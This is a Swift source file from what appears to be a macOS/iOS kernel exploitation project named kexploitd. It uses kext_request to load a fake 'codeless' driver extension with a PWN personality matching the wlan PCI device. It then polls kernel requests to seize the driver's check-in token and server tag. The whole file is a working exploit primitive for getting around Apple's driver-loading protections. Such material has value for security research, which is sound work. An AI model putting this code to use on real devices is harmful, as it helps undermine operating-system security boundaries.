//
//  codelessKext.swift
//  kexploitd
//
//  Created by Linus Henze.
//  Copyright © 2021/2022 Pinauten GmbH. All rights reserved.
//

import Foundation

public typealias DKCheckinData = (token: mach_port_t, tag: UInt64)

func sendKextRequestWithDataReply(req: Any, res: inout kern_return_t) throws -> Data? {
    var resp: vm_offset_t = 0
    var respLen: mach_msg_type_number_t = 0
    
    var log: vm_offset_t = 0
    var logLen: mach_msg_type_number_t = 0
    
    let dat = try PropertyListSerialization.data(fromPropertyList: req, format: .xml, options: .zero) + Data(repeating: 0, count: 1)
    let kr = dat.withUnsafeBytes { (ptr) -> kern_return_t in
        return kext_request(mach_host_self(), 65536, vm_offset_t(bitPattern: ptr.baseAddress!), mach_msg_type_number_t(ptr.count), &resp, &respLen, &log, &logLen, &res)
    }
    
    if kr != KERN_SUCCESS {
        res = kr
        return nil
    }
    
    if log != 0 {
        vm_deallocate(mach_task_self_, log, vm_size_t(logLen))
        log = 0
        logLen = 0
    }
    
    if resp == 0 {
        return nil
    }
    
    let resData = Data(bytesNoCopy: UnsafeMutableRawPointer(bitPattern: resp)!, count: Int(respLen), deallocator: .unmap)
    return resData
}

public func sendKextRequestWithReply(req: Any, res: inout kern_return_t) throws -> Any? {
    if let res = try sendKextRequestWithDataReply(req: req, res: &res) {
        let str = String(decoding: res, as: UTF8.self)
        if str != "" {
            return try PropertyListSerialization.propertyList(from: str.replacingOccurrences(of: "<set", with: "<array").replacingOccurrences(of: "</set", with: "</array").data(using: .utf8)!, options: .init(), format: nil)
        }
        
        return try PropertyListSerialization.propertyList(from: res, options: .init(), format: nil)
    }
    
    return nil
}

func sendRequest(req: Any) throws -> kern_return_t {
    var kr: kern_return_t = 0
    _ = try sendKextRequestWithReply(req: req, res: &kr)
    
    return kr
}

func loadCodelessKext(bundleName: String) throws -> kern_return_t {
    let req = [
        "Kext Request Predicate": "LoadCodelessKext",
        "Kext Request Arguments": [
            "CFBundleIdentifier": bundleName,
            "Codeless Kext Info": [
                "_CodelessKextBundlePath": "<none>",
                "CFBundleIdentifier": bundleName,
                "CFBundleVersion": "1.0",
                "CFBundlePackageType": "DEXT",
                "IOKitPersonalities": [
                    "PWN": [
                        "CFBundleIdentifier": bundleName,
                        "CFBundleIdentifierKernel": "com.apple.kpi.iokit",
                        "IOClass": "IOUserService",
                        "IOMatchCategory": "PWNDriver",
                        "IOProviderClass": "IOPCIDevice",
                        "IOResourceMatch": "IOKit",
                        "IOUserClass": "oobPCIDriver",
                        "IOUserServerName": "oobPCIDriver",
                        "IONameMatch": "wlan",
                        "PWNProps": [
                            "IOClass": "IOUserUserClient",
                            "IOUserClass": "PWNDriverUC"
                        ]
                    ]
                ]
            ]
        ]
    ] as Any
    
    return try sendRequest(req: req)
}

public func getDKCheckinData() -> (token: mach_port_t, tag: UInt64)? {
    // Generate random kext bundle name
    let bundleName = String(format: "de.pinauten.pwn-%p-%p", arc4random(), arc4random())
    
    // Attempt to load codeless kext first
    guard let kr = try? loadCodelessKext(bundleName: bundleName),
          kr == KERN_SUCCESS else {
        return nil
    }
    
    // Now get launch request
    let req = [
        "Kext Request Predicate": "Get Kernel Requests",
        "Kext Request Arguments": [
            "CFBundleIdentifier": bundleName
        ]
    ] as Any
    
    var result: (token: mach_port_t, tag: UInt64)?
    
    for _ in 0..<500 {
        var kr: kern_return_t = 0
        if let res = try? sendKextRequestWithReply(req: req, res: &kr) as? [[String: Any]] {
            for x in res {
                // That's a really long if statement...
                if let pred = x["Kext Request Predicate"] as? String,
                   pred == "Dext Daemon Launch",
                   let args = x["Kext Request Arguments"] as? [String: Any],
                   let bundle = args["CFBundleIdentifier"] as? String,
                   bundle.starts(with: "de.pinauten.pwn-"),
                   let token = args["Check In Token"] as? mach_port_t,
                   let tag = args["Driver Extension Server Tag"] as? UInt64 {
                    // ...'then' part starts here...
                    if result == nil {
                        result = (token: token, tag: tag)
                    } else {
                        if token != result.unsafelyUnwrapped.token {
                            mach_port_destroy(mach_task_self_, token)
                        }
                    }
                }
            }
            
            if result != nil {
                break
            }
        }
    }
    
    return result
}
